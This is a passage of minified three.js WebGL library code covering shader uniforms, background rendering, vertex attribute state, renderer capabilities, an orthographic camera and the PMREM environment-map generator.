gment:iu,specularmap_pars_fragment:ru,tonemapping_fragment:su,tonemapping_pars_fragment:au,transmission_fragment:ou,transmission_pars_fragment:lu,uv_pars_fragment:cu,uv_pars_vertex:du,uv_vertex:uu,worldpos_vertex:pu,background_vert:fu,background_frag:hu,backgroundCube_vert:mu,backgroundCube_frag:_u,cube_vert:gu,cube_frag:vu,depth_vert:xu,depth_frag:Eu,distanceRGBA_vert:yu,distanceRGBA_frag:Su,equirect_vert:Mu,equirect_frag:bu,linedashed_vert:Tu,linedashed_frag:Au,meshbasic_vert:Ru,meshbasic_frag:wu,meshlambert_vert:Cu,meshlambert_frag:Pu,meshmatcap_vert:Iu,meshmatcap_frag:Lu,meshnormal_vert:Du,meshnormal_frag:Nu,meshphong_vert:Ou,meshphong_frag:Uu,meshphysical_vert:Fu,meshphysical_frag:ku,meshtoon_vert:zu,meshtoon_frag:Bu,points_vert:Gu,points_frag:Hu,shadow_vert:Vu,shadow_frag:Wu,sprite_vert:Xu,sprite_frag:qu},ie={common:{diffuse:{value:new He(16777215)},opacity:{value:1},map:{value:null},mapTransform:{value:new ke},alphaMap:{value:null},alphaMapTransform:{value:new ke},alphaTest:{value:0}},specularmap:{specularMap:{value:null},specularMapTransform:{value:new ke}},envmap:{envMap:{value:null},flipEnvMap:{value:-1},reflectivity:{value:1},ior:{value:1.5},refractionRatio:{value:.98}},aomap:{aoMap:{value:null},aoMapIntensity:{value:1},aoMapTransform:{value:new ke}},lightmap:{lightMap:{value:null},lightMapIntensity:{value:1},lightMapTransform:{value:new ke}},bumpmap:{bumpMap:{value:null},bumpMapTransform:{value:new ke},bumpScale:{value:1}},normalmap:{normalMap:{value:null},normalMapTransform:{value:new ke},normalScale:{value:new Be(1,1)}},displacementmap:{displacementMap:{value:null},displacementMapTransform:{value:new ke},displacementScale:{value:1},displacementBias:{value:0}},emissivemap:{emissiveMap:{value:null},emissiveMapTransform:{value:new ke}},metalnessmap:{metalnessMap:{value:null},metalnessMapTransform:{value:new ke}},roughnessmap:{roughnessMap:{value:null},roughnessMapTransform:{value:new ke}},gradientmap:{gradientMap:{value:null}},fog:{fogDensity:{value:25e-5},fogNear:{value:1},fogFar:{value:2e3},fogColor:{value:new He(16777215)}},lights:{ambientLightColor:{value:[]},lightProbe:{value:[]},directionalLights:{value:[],properties:{direction:{},color:{}}},directionalLightShadows:{value:[],properties:{shadowBias:{},shadowNormalBias:{},shadowRadius:{},shadowMapSize:{}}},directionalShadowMap:{value:[]},directionalShadowMatrix:{value:[]},spotLights:{value:[],properties:{color:{},position:{},direction:{},distance:{},coneCos:{},penumbraCos:{},decay:{}}},spotLightShadows:{value:[],properties:{shadowBias:{},shadowNormalBias:{},shadowRadius:{},shadowMapSize:{}}},spotLightMap:{value:[]},spotShadowMap:{value:[]},spotLightMatrix:{value:[]},pointLights:{value:[],properties:{color:{},position:{},decay:{},distance:{}}},pointLightShadows:{value:[],properties:{shadowBias:{},shadowNormalBias:{},shadowRadius:{},shadowMapSize:{},shadowCameraNear:{},shadowCameraFar:{}}},pointShadowMap:{value:[]},pointShadowMatrix:{value:[]},hemisphereLights:{value:[],properties:{direction:{},skyColor:{},groundColor:{}}},rectAreaLights:{value:[],properties:{color:{},position:{},width:{},height:{}}},ltc_1:{value:null},ltc_2:{value:null}},points:{diffuse:{value:new He(16777215)},opacity:{value:1},size:{value:1},scale:{value:1},map:{value:null},alphaMap:{value:null},alphaMapTransform:{value:new ke},alphaTest:{value:0},uvTransform:{value:new ke}},sprite:{diffuse:{value:new He(16777215)},opacity:{value:1},center:{value:new Be(.5,.5)},rotation:{value:0},map:{value:null},mapTransform:{value:new ke},alphaMap:{value:null},alphaMapTransform:{value:new ke},alphaTest:{value:0}}},Gt={basic:{uniforms:_t([ie.common,ie.specularmap,ie.envmap,ie.aomap,ie.lightmap,ie.fog]),vertexShader:Ie.meshbasic_vert,fragmentShader:Ie.meshbasic_frag},lambert:{uniforms:_t([ie.common,ie.specularmap,ie.envmap,ie.aomap,ie.lightmap,ie.emissivemap,ie.bumpmap,ie.normalmap,ie.displacementmap,ie.fog,ie.lights,{emissive:{value:new He(0)}}]),vertexShader:Ie.meshlambert_vert,fragmentShader:Ie.meshlambert_frag},phong:{uniforms:_t([ie.common,ie.specularmap,ie.envmap,ie.aomap,ie.lightmap,ie.emissivemap,ie.bumpmap,ie.normalmap,ie.displacementmap,ie.fog,ie.lights,{emissive:{value:new He(0)},specular:{value:new He(1118481)},shininess:{value:30}}]),vertexShader:Ie.meshphong_vert,fragmentShader:Ie.meshphong_frag},standard:{uniforms:_t([ie.common,ie.envmap,ie.aomap,ie.lightmap,ie.emissivemap,ie.bumpmap,ie.normalmap,ie.displacementmap,ie.roughnessmap,ie.metalnessmap,ie.fog,ie.lights,{emissive:{value:new He(0)},roughness:{value:1},metalness:{value:0},envMapIntensity:{value:1}}]),vertexShader:Ie.meshphysical_vert,fragmentShader:Ie.meshphysical_frag},toon:{uniforms:_t([ie.common,ie.aomap,ie.lightmap,ie.emissivemap,ie.bumpmap,ie.normalmap,ie.displacementmap,ie.gradientmap,ie.fog,ie.lights,{emissive:{value:new He(0)}}]),vertexShader:Ie.meshtoon_vert,fragmentShader:Ie.meshtoon_frag},matcap:{uniforms:_t([ie.common,ie.bumpmap,ie.normalmap,ie.displacementmap,ie.fog,{matcap:{value:null}}]),vertexShader:Ie.meshmatcap_vert,fragmentShader:Ie.meshmatcap_frag},points:{uniforms:_t([ie.points,ie.fog]),vertexShader:Ie.points_vert,fragmentShader:Ie.points_frag},dashed:{uniforms:_t([ie.common,ie.fog,{scale:{value:1},dashSize:{value:1},totalSize:{value:2}}]),vertexShader:Ie.linedashed_vert,fragmentShader:Ie.linedashed_frag},depth:{uniforms:_t([ie.common,ie.displacementmap]),vertexShader:Ie.depth_vert,fragmentShader:Ie.depth_frag},normal:{uniforms:_t([ie.common,ie.bumpmap,ie.normalmap,ie.displacementmap,{opacity:{value:1}}]),vertexShader:Ie.meshnormal_vert,fragmentShader:Ie.meshnormal_frag},sprite:{uniforms:_t([ie.sprite,ie.fog]),vertexShader:Ie.sprite_vert,fragmentShader:Ie.sprite_frag},background:{uniforms:{uvTransform:{value:new ke},t2D:{value:null},backgroundIntensity:{value:1}},vertexShader:Ie.background_vert,fragmentShader:Ie.background_frag},backgroundCube:{uniforms:{envMap:{value:null},flipEnvMap:{value:-1},backgroundBlurriness:{value:0},backgroundIntensity:{value:1}},vertexShader:Ie.backgroundCube_vert,fragmentShader:Ie.backgroundCube_frag},cube:{uniforms:{tCube:{value:null},tFlip:{value:-1},opacity:{value:1}},vertexShader:Ie.cube_vert,fragmentShader:Ie.cube_frag},equirect:{uniforms:{tEquirect:{value:null}},vertexShader:Ie.equirect_vert,fragmentShader:Ie.equirect_frag},distanceRGBA:{uniforms:_t([ie.common,ie.displacementmap,{referencePosition:{value:new L},nearDistance:{value:1},farDistance:{value:1e3}}]),vertexShader:Ie.distanceRGBA_vert,fragmentShader:Ie.distanceRGBA_frag},shadow:{uniforms:_t([ie.lights,ie.fog,{color:{value:new He(0)},opacity:{value:1}}]),vertexShader:Ie.shadow_vert,fragmentShader:Ie.shadow_frag}};Gt.physical={uniforms:_t([Gt.standard.uniforms,{clearcoat:{value:0},clearcoatMap:{value:null},clearcoatMapTransform:{value:new ke},clearcoatNormalMap:{value:null},clearcoatNormalMapTransform:{value:new ke},clearcoatNormalScale:{value:new Be(1,1)},clearcoatRoughness:{value:0},clearcoatRoughnessMap:{value:null},clearcoatRoughnessMapTransform:{value:new ke},iridescence:{value:0},iridescenceMap:{value:null},iridescenceMapTransform:{value:new ke},iridescenceIOR:{value:1.3},iridescenceThicknessMinimum:{value:100},iridescenceThicknessMaximum:{value:400},iridescenceThicknessMap:{value:null},iridescenceThicknessMapTransform:{value:new ke},sheen:{value:0},sheenColor:{value:new He(0)},sheenColorMap:{value:null},sheenColorMapTransform:{value:new ke},sheenRoughness:{value:1},sheenRoughnessMap:{value:null},sheenRoughnessMapTransform:{value:new ke},transmission:{value:0},transmissionMap:{value:null},transmissionMapTransform:{value:new ke},transmissionSamplerSize:{value:new Be},transmissionSamplerMap:{value:null},thickness:{value:0},thicknessMap:{value:null},thicknessMapTransform:{value:new ke},attenuationDistance:{value:0},attenuationColor:{value:new He(0)},specularColor:{value:new He(1,1,1)},specularColorMap:{value:null},specularColorMapTransform:{value:new ke},specularIntensity:{value:1},specularIntensityMap:{value:null},specularIntensityMapTransform:{value:new ke},anisotropyVector:{value:new Be},anisotropyMap:{value:null},anisotropyMapTransform:{value:new ke}}]),vertexShader:Ie.meshphysical_vert,fragmentShader:Ie.meshphysical_frag};const Gi={r:0,b:0,g:0};function Yu(i,e,t,n,r,s,o){const a=new He(0);let l=s===!0?0:1,d,u,h=null,p=0,m=null;function E(f,c){let g=!1,_=c.isScene===!0?c.background:null;_&&_.isTexture&&(_=(c.backgroundBlurriness>0?t:e).get(_)),_===null?x(a,l):_&&_.isColor&&(x(_,1),g=!0);const v=i.xr.getEnvironmentBlendMode();v==="additive"?n.buffers.color.setClear(0,0,0,1,o):v==="alpha-blend"&&n.buffers.color.setClear(0,0,0,0,o),(i.autoClear||g)&&i.clear(i.autoClearColor,i.autoClearDepth,i.autoClearStencil),_&&(_.isCubeTexture||_.mapping===tr)?(u===void 0&&(u=new Ht(new vi(1,1,1),new An({name:"BackgroundCubeMaterial",uniforms:Qn(Gt.backgroundCube.uniforms),vertexShader:Gt.backgroundCube.vertexShader,fragmentShader:Gt.backgroundCube.fragmentShader,side:Et,depthTest:!1,depthWrite:!1,fog:!1})),u.geometry.deleteAttribute("normal"),u.geometry.deleteAttribute("uv"),u.onBeforeRender=function(w,M,T){this.matrixWorld.copyPosition(T.matrixWorld)},Object.defineProperty(u.material,"envMap",{get:function(){return this.uniforms.envMap.value}}),r.update(u)),u.material.uniforms.envMap.value=_,u.material.uniforms.flipEnvMap.value=_.isCubeTexture&&_.isRenderTargetTexture===!1?-1:1,u.material.uniforms.backgroundBlurriness.value=c.backgroundBlurriness,u.material.uniforms.backgroundIntensity.value=c.backgroundIntensity,u.material.toneMapped=We.getTransfer(_.colorSpace)!==je,(h!==_||p!==_.version||m!==i.toneMapping)&&(u.material.needsUpdate=!0,h=_,p=_.version,m=i.toneMapping),u.layers.enableAll(),f.unshift(u,u.geometry,u.material,0,0,null)):_&&_.isTexture&&(d===void 0&&(d=new Ht(new ds(2,2),new An({name:"BackgroundMaterial",uniforms:Qn(Gt.background.uniforms),vertexShader:Gt.background.vertexShader,fragmentShader:Gt.background.fragmentShader,side:cn,depthTest:!1,depthWrite:!1,fog:!1})),d.geometry.deleteAttribute("normal"),Object.defineProperty(d.material,"map",{get:function(){return this.uniforms.t2D.value}}),r.update(d)),d.material.uniforms.t2D.value=_,d.material.uniforms.backgroundIntensity.value=c.backgroundIntensity,d.material.toneMapped=We.getTransfer(_.colorSpace)!==je,_.matrixAutoUpdate===!0&&_.updateMatrix(),d.material.uniforms.uvTransform.value.copy(_.matrix),(h!==_||p!==_.version||m!==i.toneMapping)&&(d.material.needsUpdate=!0,h=_,p=_.version,m=i.toneMapping),d.layers.enableAll(),f.unshift(d,d.geometry,d.material,0,0,null))}function x(f,c){f.getRGB(Gi,Eo(i)),n.buffers.color.setClear(Gi.r,Gi.g,Gi.b,c,o)}return{getClearColor:function(){return a},setClearColor:function(f,c=1){a.set(f),l=c,x(a,l)},getClearAlpha:function(){return l},setClearAlpha:function(f){l=f,x(a,l)},render:E}}function ju(i,e,t,n){const r=i.getParameter(i.MAX_VERTEX_ATTRIBS),s=n.isWebGL2?null:e.get("OES_vertex_array_object"),o=n.isWebGL2||s!==null,a={},l=f(null);let d=l,u=!1;function h(P,z,W,Y,H){let V=!1;if(o){const q=x(Y,W,z);d!==q&&(d=q,m(d.object)),V=c(P,Y,W,H),V&&g(P,Y,W,H)}else{const q=z.wireframe===!0;(d.geometry!==Y.id||d.program!==W.id||d.wireframe!==q)&&(d.geometry=Y.id,d.program=W.id,d.wireframe=q,V=!0)}H!==null&&t.update(H,i.ELEMENT_ARRAY_BUFFER),(V||u)&&(u=!1,D(P,z,W,Y),H!==null&&i.bindBuffer(i.ELEMENT_ARRAY_BUFFER,t.get(H).buffer))}function p(){return n.isWebGL2?i.createVertexArray():s.createVertexArrayOES()}function m(P){return n.isWebGL2?i.bindVertexArray(P):s.bindVertexArrayOES(P)}function E(P){return n.isWebGL2?i.deleteVertexArray(P):s.deleteVertexArrayOES(P)}function x(P,z,W){const Y=W.wireframe===!0;let H=a[P.id];H===void 0&&(H={},a[P.id]=H);let V=H[z.id];V===void 0&&(V={},H[z.id]=V);let q=V[Y];return q===void 0&&(q=f(p()),V[Y]=q),q}function f(P){const z=[],W=[],Y=[];for(let H=0;H<r;H++)z[H]=0,W[H]=0,Y[H]=0;return{geometry:null,program:null,wireframe:!1,newAttributes:z,enabledAttributes:W,attributeDivisors:Y,object:P,attributes:{},index:null}}function c(P,z,W,Y){const H=d.attributes,V=z.attributes;let q=0;const Q=W.getAttributes();for(const $ in Q)if(Q[$].location>=0){const j=H[$];let re=V[$];if(re===void 0&&($==="instanceMatrix"&&P.instanceMatrix&&(re=P.instanceMatrix),$==="instanceColor"&&P.instanceColor&&(re=P.instanceColor)),j===void 0||j.attribute!==re||re&&j.data!==re.data)return!0;q++}return d.attributesNum!==q||d.index!==Y}function g(P,z,W,Y){const H={},V=z.attributes;let q=0;const Q=W.getAttributes();for(const $ in Q)if(Q[$].location>=0){let j=V[$];j===void 0&&($==="instanceMatrix"&&P.instanceMatrix&&(j=P.instanceMatrix),$==="instanceColor"&&P.instanceColor&&(j=P.instanceColor));const re={};re.attribute=j,j&&j.data&&(re.data=j.data),H[$]=re,q++}d.attributes=H,d.attributesNum=q,d.index=Y}function _(){const P=d.newAttributes;for(let z=0,W=P.length;z<W;z++)P[z]=0}function v(P){w(P,0)}function w(P,z){const W=d.newAttributes,Y=d.enabledAttributes,H=d.attributeDivisors;W[P]=1,Y[P]===0&&(i.enableVertexAttribArray(P),Y[P]=1),H[P]!==z&&((n.isWebGL2?i:e.get("ANGLE_instanced_arrays"))[n.isWebGL2?"vertexAttribDivisor":"vertexAttribDivisorANGLE"](P,z),H[P]=z)}function M(){const P=d.newAttributes,z=d.enabledAttributes;for(let W=0,Y=z.length;W<Y;W++)z[W]!==P[W]&&(i.disableVertexAttribArray(W),z[W]=0)}function T(P,z,W,Y,H,V,q){q===!0?i.vertexAttribIPointer(P,z,W,H,V):i.vertexAttribPointer(P,z,W,Y,H,V)}function D(P,z,W,Y){if(n.isWebGL2===!1&&(P.isInstancedMesh||Y.isInstancedBufferGeometry)&&e.get("ANGLE_instanced_arrays")===null)return;_();const H=Y.attributes,V=W.getAttributes(),q=z.defaultAttributeValues;for(const Q in V){const $=V[Q];if($.location>=0){let G=H[Q];if(G===void 0&&(Q==="instanceMatrix"&&P.instanceMatrix&&(G=P.instanceMatrix),Q==="instanceColor"&&P.instanceColor&&(G=P.instanceColor)),G!==void 0){const j=G.normalized,re=G.itemSize,pe=t.get(G);if(pe===void 0)continue;const ue=pe.buffer,Me=pe.type,Te=pe.bytesPerElement,ge=n.isWebGL2===!0&&(Me===i.INT||Me===i.UNSIGNED_INT||G.gpuType===io);if(G.isInterleavedBufferAttribute){const Oe=G.data,N=Oe.stride,nt=G.offset;if(Oe.isInstancedInterleavedBuffer){for(let ve=0;ve<$.locationSize;ve++)w($.location+ve,Oe.meshPerAttribute);P.isInstancedMesh!==!0&&Y._maxInstanceCount===void 0&&(Y._maxInstanceCount=Oe.meshPerAttribute*Oe.count)}else for(let ve=0;ve<$.locationSize;ve++)v($.location+ve);i.bindBuffer(i.ARRAY_BUFFER,ue);for(let ve=0;ve<$.locationSize;ve++)T($.location+ve,re/$.locationSize,Me,j,N*Te,(nt+re/$.locationSize*ve)*Te,ge)}else{if(G.isInstancedBufferAttribute){for(let Oe=0;Oe<$.locationSize;Oe++)w($.location+Oe,G.meshPerAttribute);P.isInstancedMesh!==!0&&Y._maxInstanceCount===void 0&&(Y._maxInstanceCount=G.meshPerAttribute*G.count)}else for(let Oe=0;Oe<$.locationSize;Oe++)v($.location+Oe);i.bindBuffer(i.ARRAY_BUFFER,ue);for(let Oe=0;Oe<$.locationSize;Oe++)T($.location+Oe,re/$.locationSize,Me,j,re*Te,re/$.locationSize*Oe*Te,ge)}}else if(q!==void 0){const j=q[Q];if(j!==void 0)switch(j.length){case 2:i.vertexAttrib2fv($.location,j);break;case 3:i.vertexAttrib3fv($.location,j);break;case 4:i.vertexAttrib4fv($.location,j);break;default:i.vertexAttrib1fv($.location,j)}}}}M()}function y(){X();for(const P in a){const z=a[P];for(const W in z){const Y=z[W];for(const H in Y)E(Y[H].object),delete Y[H];delete z[W]}delete a[P]}}function R(P){if(a[P.id]===void 0)return;const z=a[P.id];for(const W in z){const Y=z[W];for(const H in Y)E(Y[H].object),delete Y[H];delete z[W]}delete a[P.id]}function k(P){for(const z in a){const W=a[z];if(W[P.id]===void 0)continue;const Y=W[P.id];for(const H in Y)E(Y[H].object),delete Y[H];delete W[P.id]}}function X(){te(),u=!0,d!==l&&(d=l,m(d.object))}function te(){l.geometry=null,l.program=null,l.wireframe=!1}return{setup:h,reset:X,resetDefaultState:te,dispose:y,releaseStatesOfGeometry:R,releaseStatesOfProgram:k,initAttributes:_,enableAttribute:v,disableUnusedAttributes:M}}function Ku(i,e,t,n){const r=n.isWebGL2;let s;function o(u){s=u}function a(u,h){i.drawArrays(s,u,h),t.update(h,s,1)}function l(u,h,p){if(p===0)return;let m,E;if(r)m=i,E="drawArraysInstanced";else if(m=e.get("ANGLE_instanced_arrays"),E="drawArraysInstancedANGLE",m===null){console.error("THREE.WebGLBufferRenderer: using THREE.InstancedBufferGeometry but hardware does not support extension ANGLE_instanced_arrays.");return}m[E](s,u,h,p),t.update(h,s,p)}function d(u,h,p){if(p===0)return;const m=e.get("WEBGL_multi_draw");if(m===null)for(let E=0;E<p;E++)this.render(u[E],h[E]);else{m.multiDrawArraysWEBGL(s,u,0,h,0,p);let E=0;for(let x=0;x<p;x++)E+=h[x];t.update(E,s,1)}}this.setMode=o,this.render=a,this.renderInstances=l,this.renderMultiDraw=d}function $u(i,e,t){let n;function r(){if(n!==void 0)return n;if(e.has("EXT_texture_filter_anisotropic")===!0){const T=e.get("EXT_texture_filter_anisotropic");n=i.getParameter(T.MAX_TEXTURE_MAX_ANISOTROPY_EXT)}else n=0;return n}function s(T){if(T==="highp"){if(i.getShaderPrecisionFormat(i.VERTEX_SHADER,i.HIGH_FLOAT).precision>0&&i.getShaderPrecisionFormat(i.FRAGMENT_SHADER,i.HIGH_FLOAT).precision>0)return"highp";T="mediump"}return T==="mediump"&&i.getShaderPrecisionFormat(i.VERTEX_SHADER,i.MEDIUM_FLOAT).precision>0&&i.getShaderPrecisionFormat(i.FRAGMENT_SHADER,i.MEDIUM_FLOAT).precision>0?"mediump":"lowp"}const o=typeof WebGL2RenderingContext<"u"&&i.constructor.name==="WebGL2RenderingContext";let a=t.precision!==void 0?t.precision:"highp";const l=s(a);l!==a&&(console.warn("THREE.WebGLRenderer:",a,"not supported, using",l,"instead."),a=l);const d=o||e.has("WEBGL_draw_buffers"),u=t.logarithmicDepthBuffer===!0,h=i.getParameter(i.MAX_TEXTURE_IMAGE_UNITS),p=i.getParameter(i.MAX_VERTEX_TEXTURE_IMAGE_UNITS),m=i.getParameter(i.MAX_TEXTURE_SIZE),E=i.getParameter(i.MAX_CUBE_MAP_TEXTURE_SIZE),x=i.getParameter(i.MAX_VERTEX_ATTRIBS),f=i.getParameter(i.MAX_VERTEX_UNIFORM_VECTORS),c=i.getParameter(i.MAX_VARYING_VECTORS),g=i.getParameter(i.MAX_FRAGMENT_UNIFORM_VECTORS),_=p>0,v=o||e.has("OES_texture_float"),w=_&&v,M=o?i.getParameter(i.MAX_SAMPLES):0;return{isWebGL2:o,drawBuffers:d,getMaxAnisotropy:r,getMaxPrecision:s,precision:a,logarithmicDepthBuffer:u,maxTextures:h,maxVertexTextures:p,maxTextureSize:m,maxCubemapSize:E,maxAttributes:x,maxVertexUniforms:f,maxVaryings:c,maxFragmentUniforms:g,vertexTextures:_,floatFragmentTextures:v,floatVertexTextures:w,maxSamples:M}}function Zu(i){const e=this;let t=null,n=0,r=!1,s=!1;const o=new _n,a=new ke,l={value:null,needsUpdate:!1};this.uniform=l,this.numPlanes=0,this.numIntersection=0,this.init=function(h,p){const m=h.length!==0||p||n!==0||r;return r=p,n=h.length,m},this.beginShadows=function(){s=!0,u(null)},this.endShadows=function(){s=!1},this.setGlobalState=function(h,p){t=u(h,p,0)},this.setState=function(h,p,m){const E=h.clippingPlanes,x=h.clipIntersection,f=h.clipShadows,c=i.get(h);if(!r||E===null||E.length===0||s&&!f)s?u(null):d();else{const g=s?0:n,_=g*4;let v=c.clippingState||null;l.value=v,v=u(E,p,_,m);for(let w=0;w!==_;++w)v[w]=t[w];c.clippingState=v,this.numIntersection=x?this.numPlanes:0,this.numPlanes+=g}};function d(){l.value!==t&&(l.value=t,l.needsUpdate=n>0),e.numPlanes=n,e.numIntersection=0}function u(h,p,m,E){const x=h!==null?h.length:0;let f=null;if(x!==0){if(f=l.value,E!==!0||f===null){const c=m+x*4,g=p.matrixWorldInverse;a.getNormalMatrix(g),(f===null||f.length<c)&&(f=new Float32Array(c));for(let _=0,v=m;_!==x;++_,v+=4)o.copy(h[_]).applyMatrix4(g,a),o.normal.toArray(f,v),f[v+3]=o.constant}l.value=f,l.needsUpdate=!0}return e.numPlanes=x,e.numIntersection=0,f}}function Qu(i){let e=new WeakMap;function t(o,a){return a===Kr?o.mapping=Kn:a===$r&&(o.mapping=$n),o}function n(o){if(o&&o.isTexture){const a=o.mapping;if(a===Kr||a===$r)if(e.has(o)){const l=e.get(o).texture;return t(l,o.mapping)}else{const l=o.image;if(l&&l.height>0){const d=new dc(l.height/2);return d.fromEquirectangularTexture(i,o),e.set(o,d),o.addEventListener("dispose",r),t(d.texture,o.mapping)}else return null}}return o}function r(o){const a=o.target;a.removeEventListener("dispose",r);const l=e.get(a);l!==void 0&&(e.delete(a),l.dispose())}function s(){e=new WeakMap}return{get:n,dispose:s}}class Ju extends yo{constructor(e=-1,t=1,n=1,r=-1,s=.1,o=2e3){super(),this.isOrthographicCamera=!0,this.type="OrthographicCamera",this.zoom=1,this.view=null,this.left=e,this.right=t,this.top=n,this.bottom=r,this.near=s,this.far=o,this.updateProjectionMatrix()}copy(e,t){return super.copy(e,t),this.left=e.left,this.right=e.right,this.top=e.top,this.bottom=e.bottom,this.near=e.near,this.far=e.far,this.zoom=e.zoom,this.view=e.view===null?null:Object.assign({},e.view),this}setViewOffset(e,t,n,r,s,o){this.view===null&&(this.view={enabled:!0,fullWidth:1,fullHeight:1,offsetX:0,offsetY:0,width:1,height:1}),this.view.enabled=!0,this.view.fullWidth=e,this.view.fullHeight=t,this.view.offsetX=n,this.view.offsetY=r,this.view.width=s,this.view.height=o,this.updateProjectionMatrix()}clearViewOffset(){this.view!==null&&(this.view.enabled=!1),this.updateProjectionMatrix()}updateProjectionMatrix(){const e=(this.right-this.left)/(2*this.zoom),t=(this.top-this.bottom)/(2*this.zoom),n=(this.right+this.left)/2,r=(this.top+this.bottom)/2;let s=n-e,o=n+e,a=r+t,l=r-t;if(this.view!==null&&this.view.enabled){const d=(this.right-this.left)/this.view.fullWidth/this.zoom,u=(this.top-this.bottom)/this.view.fullHeight/this.zoom;s+=d*this.view.offsetX,o=s+d*this.view.width,a-=u*this.view.offsetY,l=a-u*this.view.height}this.projectionMatrix.makeOrthographic(s,o,a,l,this.near,this.far,this.coordinateSystem),this.projectionMatrixInverse.copy(this.projectionMatrix).invert()}toJSON(e){const t=super.toJSON(e);return t.object.zoom=this.zoom,t.object.left=this.left,t.object.right=this.right,t.object.top=this.top,t.object.bottom=this.bottom,t.object.near=this.near,t.object.far=this.far,this.view!==null&&(t.object.view=Object.assign({},this.view)),t}}const Xn=4,va=[.125,.215,.35,.446,.526,.582],xn=20,Or=new Ju,xa=new He;let Ur=null,Fr=0,kr=0;const gn=(1+Math.sqrt(5))/2,Vn=1/gn,Ea=[new L(1,1,1),new L(-1,1,1),new L(1,1,-1),new L(-1,1,-1),new L(0,gn,Vn),new L(0,gn,-Vn),new L(Vn,0,gn),new L(-Vn,0,gn),new L(gn,Vn,0),new L(-gn,Vn,0)];class ya{constructor(e){this._renderer=e,this._pingPongRenderTarget=null,this._lodMax=0,this._cubeSize=0,this._lodPlanes=[],this._sizeLods=[],this._sigmas=[],this._blurMaterial=null,this._cubemapMaterial=null,this._equirectMaterial=null,this._compileMaterial(this._blurMaterial)}fromScene(e,t=0,n=.1,r=100){Ur=this._renderer.getRenderTarget(),Fr=this._renderer.getActiveCubeFace(),kr=this._renderer.getActiveMipmapLevel(),this._setSize(256);const s=this._allocateTargets();return s.depthBuffer=!0,this._sceneToCubeUV(e,n,r,s),t>0&&this._blur(s,0,0,t),this._applyPMREM(s),this._cleanup(s),s}fromEquirectangular(e,t=null){return this._fromTexture(e,t)}fromCubemap(e,t=null){return this._fromTexture(e,t)}compileCubemapShader(){this._cubemapMaterial===null&&(this._cubemapMaterial=ba(),this._compileMaterial(this._cubemapMaterial))}compileEquirectangularShader(){this._equirectMaterial===null&&(this._equirectMaterial=Ma(),this._compileMaterial(this._equirectMaterial))}dispose(){this._dispose(),this._cubemapMaterial!==null&&this._cubemapMaterial.dispose(),this._equirectMaterial!==null&&this._equirectMaterial.dispose()}_setSize(e){this._lodMax=Math.floor(Math.log2(e)),this._cubeSize=Math.pow(2,this._lodMax)}_dispose(){this._blurMaterial!==null&&this._blurMaterial.dispose(),this._pingPongRenderTarget!==null&&this._pingPongRenderTarget.dispose();for(let e=0;e<this._lodPlanes.length;e++)this._lodPlanes[e].dispose()}_cleanup(e){this._renderer.setRenderTarget(Ur,Fr,kr),e.scissorTest=!1,Hi(e,0,0,e.width,e.height)}_fromTexture(e,t){e.mapping===Kn||e.mapping===$n?this._setSize(e.image.length===0?16:e.image[0].width||e.image[0].image.width):this._setSize(e.image.width/4),Ur=this._renderer.getRenderTarget(),Fr=this._renderer.getActiveCubeFace(),kr=this._renderer.getActiveMipmapLevel();const n=t||this._allocateTargets();return this._textureToCubeUV(e,n),this._applyPMREM(n),this._cleanup(n),n}_allocateTargets(){const e=3*Math.max(this._cubeSize,112),t=4*this._cubeSize,n={magFilter:wt,minFilter:wt,generateMipmaps:!1,type:hi,format:kt,colorSpace:Zt,depthBuffer:!1},r=Sa(e,t,n);if(this._pingPongRenderTarget===null||this._pingPongRenderTarget.width!==e||this._pingPongRenderTarget.height!==t){this._pingPongRenderTarget!==null&&this._dispose(),this._pingPongRenderTarget=Sa(e,t,n);const{_lodMax:s}=this;({sizeLods:this._sizeLods,lodPlanes:this._lodPlanes,sigmas:this._sigmas}=ep(s)),this._blurMaterial=tp(s,e,t)}return r}_compileMaterial(e){const t=new Ht(this._lodPlanes[0],e);this._renderer.compile(t,Or)}_sceneToCubeUV(e,t,n,r){const a=new Ct(90,1,t,n),l=[1,-1,1,1,1,1],d=[1,1,1,-1,-1,-1],u=this._renderer,h=u.autoClear,p=u.toneMapping;u.getClearColor(xa),u.toneMapping=on,u.autoClear=!1;const m=new pi({name:"PMREM.Background",side:Et,depthWrite:!1,depthTest:!1}),E=new Ht(new vi,m);let x=!1;const f=e.background;f?f.isColor&&(m.color.copy(f),e.background=null,x=!0):(m.color.copy(xa),x=!0);for(let c=0;c<6;c++){const g=c%3;g===0?(a.up.set(0,l[c],0),a.lookAt(d[c],0,0)):g===1?(a.up.set(0,0,l[c]),a.lookAt(0,d[c],0)):(a.up.set(0,l[c],0),a.lookAt(0,0,d[c]));const _=this._cubeSize;Hi(r,g*_,c>2?_:0,_,_),u.setRenderTarget(r),x&&u.render(E,a),u.render(e,a)}E.geometry.dispose(),E.material.dispose(),u.toneMapping=p,u.autoClear=h,e.background=f}_textureToCubeUV(e,t){const n=this._renderer,r=e.mapping===Kn||e.mapping===$n;r?(this._cubemapMaterial===null&&(this._cubemapMaterial=ba()),this._cubemapMaterial.uniforms.flipEnvMap.value=e.isRenderTargetTexture===!1?-1:1):this._equirectMaterial===null&&(this._equirectMaterial=Ma());const s=r?this._cubemapMaterial:this._equirectMaterial,o=new Ht(this._lodPlanes[0],s),a=s.uniforms;a.envMap.value=e;const l=this._cubeSize;Hi(t,0,0,3*l,2*l),n.setRenderTarget(t),n.render(o,Or)}_applyPMREM(e){const t=this._renderer,n=t.autoClear;t.autoClear=!1;for(let r=1;r<this._lodPlanes.length;r++){const s=Math.sqrt(this._sigmas[r]*this._sigmas[r]-this._sigmas[r-1]*this._sigmas[r-1]),o=Ea[(r-1)%Ea.length];this._blur(e,r-1,r,s,o)}t.autoClear=n}_blur(e,t,n,r,s){const o=this._pingPongRenderTarget;this._halfBlur(e,o,t,n,r,"latitudinal",s),this._halfBlur(o,e,n,n,r,"longitudinal",s)}_halfBlur(e,t,n,r,s,o,a){const l=this._renderer,d=this._blurMaterial;o!=="latitudinal"&&o!=="longitudinal"&&console.error("blur direction must be either latitudinal or longitudinal!");const u=3,h=new Ht(this._lodPlanes[r],d),p=d.uniforms,m=this._sizeLods[n]-1,E=isFinite(s)?Math.PI/(2*m):2*Math.PI/(2*xn-1),x=s/E,f=isFinite(s)?1+Math.floor(u*x):xn;f>xn&&console.warn(`sigmaRadians, ${s}, is too large and will clip, as it requested ${f} samples when the maximum is set to ${xn}`);const c=[];let g=0;for(let T=0;T<xn;++T){const D=T/x,y=Math.exp(-D*D/2);c.push(y),T===0?g+=y:T<f&&(g+=2*y)}for(let 